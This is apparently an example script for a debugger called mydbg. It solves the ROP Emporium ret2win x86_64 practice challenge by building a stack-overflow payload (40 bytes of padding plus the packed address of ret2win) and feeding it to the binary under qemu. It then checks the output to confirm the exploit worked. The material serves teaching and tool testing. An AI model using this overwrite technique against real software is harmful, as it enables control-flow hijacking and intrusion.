"""ROP Emporium ret2win on x86_64, solved inside mydbg.

Engine-owned qemu-user session (qemu=), payload through a stdin file, symbol
breakpoint resolved by the engine's ELF table, chain verified through the
session's output capture.

    ./build/dev/mydbg --headless-script examples/rop_emporium/solve_ret2win_x64.py
"""

from __future__ import annotations

import struct

from mydbg import symbolic

import emporium

PAD = 40  # 32-byte buffer + saved rbp; the return slot follows


def run(dbg):
    if not symbolic.requires_angr():
        raise RuntimeError(symbolic.BOOTSTRAP_HINT)
    emporium.require_sysroots(("x64",))
    binary = emporium.challenge_path("x64", "ret2win")
    project = symbolic._entry_project(dbg, binary=binary)  # noqa: SLF001
    target = symbolic.resolve_project_symbol(project, "ret2win")
    payload = b"A" * PAD + struct.pack("<Q", target)
    print(f"[+] ret2win at {target:#x}, pad {PAD}")

    process = emporium.qemu_connect(dbg, "x64", binary, payload=payload)

    dbg.set_breakpoint("pwnme")
    result = dbg.continue_and_wait(timeout=30)
    if result.state != "stopped":
        raise RuntimeError("pwnme was not reached")
    print(f"[+] stopped at pwnme ({dbg.snapshot().pc:#x})")

    after_read = emporium.after_read_address(dbg)
    dbg.set_breakpoint(f"{after_read:#x}")
    result = dbg.continue_and_wait(timeout=30)
    if result.state != "stopped":
        raise RuntimeError("the after-read stop was missed")
    print(f"[+] stopped after the read at {after_read:#x}")

    result = dbg.continue_and_wait(timeout=30)
    output = emporium.drain(process, seconds=5.0)
    if b"Well done" not in output:
        raise RuntimeError(f"ret2win chain failed: {output[-160:]!r}")
    print("[+] ret2win-x64-solve-ok:", output[-120:].decode(errors="replace").strip())
